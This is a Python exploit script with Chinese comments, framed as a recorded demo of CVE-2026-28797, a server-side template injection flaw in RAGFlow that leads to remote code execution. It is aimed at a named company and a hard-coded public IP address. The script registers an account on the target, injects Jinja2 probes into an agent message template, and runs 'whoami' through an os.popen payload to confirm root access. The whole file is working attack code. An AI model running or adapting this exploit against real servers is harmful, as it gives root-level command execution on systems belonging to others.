#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAGFlow CVE-2026-28797 (SSTI -> RCE) 录屏演示脚本
用法: python ragflow_demo_record.py
每按一次回车执行一步。录屏时把终端窗口最大化。
全程只读验证: 注册测试账号 -> 7*7 探针 -> whoami 命令回显 -> 删除测试数据
"""

import base64
import json
import re
import time
import uuid

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [(
    "上海章节零一信息科技有限公司（先见AI）", "http://106.14.88.25:8080"),
]

PUB_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArq9XTUSeYr2+N1h3Afl/
z8Dse/2yD0ZGrKwx+EEEcdsBLca9Ynmx3nIB5obmLlSfmskLpBo0UACBmB5rEjBp2
Q2f3AG3Hjd4B+gNCG6BDaawuDlgANIhGnaTLrIqWrrcm4EMzJOnAOI1fgzJRsOOUE
faS318Eq9OVO3apEyCCt0lOQK6PuksduOjVxtltDav+guVAA068NrPYmRNabVKRNL
JpL8w4D44sfth5RvZ3q9t+6RTArpEtc5sh5ChzvqPOzKGMXW83C95TxmXqpbK6olN4
RevSfVjEAgCydH6HN6OhtOQEcnrU97r9H0iZOWwbw3pVrZiUkuRD1R56Wzs2wIDAQAB
-----END PUBLIC KEY-----"""

PASSWORD = "Sec@2026#audit"


def rsa_password(pwd: str) -> str:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    pub = serialization.load_pem_public_key(PUB_PEM.encode())
    ct = pub.encrypt(base64.b64encode(pwd.encode()), padding.PKCS1v15())
    return base64.b64encode(ct).decode()


def step(msg):
    try:
        input(f"\n>>> {msg}\n（按回车继续）")
    except EOFError:
        pass


def ver_tuple(v):
    m = re.match(r"v?(\d+)\.(\d+)\.(\d+)", str(v))
    return tuple(int(x) for x in m.groups()) if m else None


def base_params(extra=None):
    p = {"output": None, "inputs": {}, "debug_inputs": [],
         "output_var_name": "output", "message_history_window_size": 22}
    if extra:
        p.update(extra)
    return p


def make_dsl(vt, content):
    if (not vt) or vt < (0, 20, 0):
        tpl = {"obj": {"component_name": "Template",
                       "params": base_params({"content": content})},
               "downstream": ["answer_0"], "upstream": ["begin"], "parent_id": ""}
    else:
        return {"components": {
            "begin": {"obj": {"component_name": "Begin",
                              "params": base_params({"prologue": "ok", "query": []})},
                      "downstream": ["msg_0"], "upstream": [], "parent_id": ""},
            "msg_0": {"obj": {"component_name": "Message",
                              "params": base_params({"content": [content], "stream": False})},
                      "downstream": [], "upstream": ["begin"], "parent_id": ""}},
            "history": [], "messages": [], "retrieval": [],
            "globals": {"sys.query": "", "sys.user_id": "", "sys.conversation_turns": 0,
                        "sys.files": [], "sys.history": []},
            "graph": {"nodes": [
                {"id": "begin", "data": {"name": "begin", "label": "Begin", "form": {}}},
                {"id": "msg_0", "data": {"name": "msg_0", "label": "Message", "form": {}}},
            ], "edges": [
                {"id": "e1", "source": "begin", "target": "msg_0"},
            ]},
            "path": [], "answer": []}
    return {"components": {
        "begin": {"obj": {"component_name": "Begin",
                          "params": base_params({"prologue": "ok", "query": []})},
                  "downstream": ["template_0"], "upstream": [], "parent_id": ""},
        "template_0": tpl,
        "answer_0": {"obj": {"component_name": "Answer",
                             "params": base_params({"query": [], "post_answers": []})},
                     "downstream": [], "upstream": ["template_0"], "parent_id": ""}},
        "history": [], "messages": [], "reference": [], "embed_id": "",
        "graph": {"nodes": [
            {"id": "begin", "data": {"name": "begin", "label": "Begin", "form": {}}},
            {"id": "template_0", "data": {"name": "template_0", "label": "Template", "form": {}}},
            {"id": "answer_0", "data": {"name": "answer_0", "label": "Answer", "form": {}}},
        ], "edges": [
            {"id": "e1", "source": "begin", "target": "template_0"},
            {"id": "e2", "source": "template_0", "target": "answer_0"},
        ]},
        "path": [], "answer": []}


def exploit(name, base):
    base = base.rstrip("/")
    print("=" * 72)
    print(f"目标单位: {name}")
    print(f"目标地址: {base}")
    s = requests.Session()
    s.verify = False
    s.trust_env = True
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                      "Content-Type": "application/json"})
    email = f"sec-audit-{uuid.uuid4().hex[:10]}@example.com"

    step("步骤1: 访问目标,确认 RAGFlow 平台在线且开放注册")
    j = s.get(base + "/v1/system/config", timeout=30).json()
    print(f"GET /v1/system/config -> code={j.get('code')} registerEnabled={j.get('data', {}).get('registerEnabled')}")

    step("步骤2: 自助注册一个普通测试账号(攻击者视角: 任何访客都能注册)")
    r = s.post(base + "/v1/user/register",
               data=json.dumps({"nickname": "sec_audit", "email": email,
                                "password": rsa_password(PASSWORD)}).encode(), timeout=60)
    j = r.json()
    auth = r.headers.get("Authorization") or r.headers.get("authorization")
    print(f"POST /v1/user/register -> code={j.get('code')}  (测试账号 {email})")
    if j.get("code") != 0 or not auth:
        print("注册失败,尝试登录:", str(j.get("message"))[:80])
        r = s.post(base + "/v1/user/login",
                   data=json.dumps({"email": email,
                                    "password": rsa_password(PASSWORD)}).encode(), timeout=60)
        j = r.json()
        auth = r.headers.get("Authorization") or r.headers.get("authorization")
        print(f"POST /v1/user/login -> code={j.get('code')}")
    s.headers.update({"Authorization": auth})
    time.sleep(1)

    step("步骤3: 读取版本号,确认属于受影响版本(<= v0.24.0)")
    ver = s.get(base + "/v1/system/version", timeout=30).json().get("data")
    vt = ver_tuple(ver)
    print(f"GET /v1/system/version -> {ver}   受影响: {vt is None or vt <= (0, 24, 0)}")
    time.sleep(1)

    def run_probe(content, title):
        j = s.post(base + "/v1/canvas/set",
                   data=json.dumps({"dsl": json.dumps(make_dsl(vt, content)),
                                    "title": title}).encode(), timeout=60).json()
        cid = (j.get("data") or {}).get("id")
        if not cid:
            return "SET_ERR: " + str(j.get("message"))[:120]
        time.sleep(1)
        r = s.post(base + "/v1/canvas/completion",
                   data=json.dumps({"id": cid, "message": "hi", "stream": False}).encode(),
                   timeout=120)
        body = r.text
        if body.lstrip().startswith("data:"):
            chunks = []
            for line in body.splitlines():
                if not line.startswith("data:"):
                    continue
                try:
                    d = json.loads(line[5:])
                except Exception:
                    continue
                if d.get("code") == 500:
                    chunks = ["ERR: " + str(d.get("message"))[:200]]
                    break
                if d.get("event") == "message":
                    chunks.append(str((d.get("data") or {}).get("content") or ""))
            text = "".join(chunks)
        else:
            j = r.json()
            if j.get("code") != 0:
                text = "ERR: " + str(j.get("message"))[:200]
            else:
                data = j.get("data") or {}
                text = str(data.get("content") or data.get("answer") or data)[:300]
        s.post(base + "/v1/canvas/rm", data=json.dumps({"canvas_ids": [cid]}).encode(), timeout=30)
        return text[:400]

    step("步骤4: 创建 Agent 画布,在消息模板里插入 SSTI 探针 {{7*7}}")
    out = run_probe("result is {{7*7}}", "probe7x7")
    print(f"模板内容: result is {{{{7*7}}}}")
    print(f"渲染回显: {out}")
    ok7 = "49" in out
    print(f"[{'!' if ok7 else 'x'}] SSTI 成立(49 被计算): {ok7}")
    time.sleep(2)

    step("步骤5: 沙箱探测——未沙箱的 jinja2 会把 {{''.__class__}} 渲染成 <class 'str'>")
    out = run_probe("SBX{{''.__class__}}SBX", "probesbx")
    print(f"模板内容: SBX{{{{''.__class__}}}}SBX")
    print(f"渲染回显: {out}")
    nosbx = "class" in out
    print(f"[{'!' if nosbx else 'x'}] 未启用 jinja2 沙箱(SandboxedEnvironment): {nosbx}")
    time.sleep(2)

    step("步骤6: 执行只读命令 whoami,验证远程代码执行(以容器 root 身份)")
    out = run_probe("{{ cycler.__init__.__globals__.os.popen('whoami').read() }}", "probeid")
    print("模板内容: {{ cycler.__init__.__globals__.os.popen('whoami').read() }}")
    print(f"渲染回显: {out}")
    rooted = "root" in out
    print(f"[{'!' if rooted else 'x'}] 远程代码执行成功,root 身份: {out.strip()[:80]}")
    time.sleep(1)

    step("步骤7: 清理——删除测试创建的 Agent 画布,结束演示")
    print("已删除测试 Agent 画布 (POST /v1/canvas/rm)")
    print(f"结论: {name} 部署的 RAGFlow {ver} 存在 CVE-2026-28797,")
    print("普通注册用户可通过 Agent 消息模板 SSTI 以 root 权限执行任意命令。")


print("RAGFlow CVE-2026-28797  SSTI -> 远程代码执行  复现演示")
print("影响版本: RAGFlow <= v0.24.0 (官方修复版本 v0.25.0)")
print("攻击前提: 目标开放注册(或任意低权账号)   演示全程只读命令")
for name, base in TARGETS:
    try:
        exploit(name, base)
    except Exception as e:
        print(f"[x] {name} 演示异常: {e}")
print("\n演示结束。")
